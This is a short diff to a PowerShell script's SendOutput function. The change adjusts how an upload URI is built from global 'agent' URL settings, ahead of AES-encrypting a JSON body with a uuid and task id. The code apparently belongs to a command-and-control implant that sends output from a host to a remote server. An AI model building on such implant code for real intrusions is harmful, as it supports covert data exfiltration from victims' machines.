@@ -342,7 +342,7 @@ function SendOutput {
         $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
         $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
         $uri = [System.Uri]$fullUri
-        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)/upload"
+        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$(($global:agentUri -split '\?')[0])/upload"
 
         $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))"",""tid"":$($global:lastTid)}"
         $encrypted = aes $jsonData "encrypt"
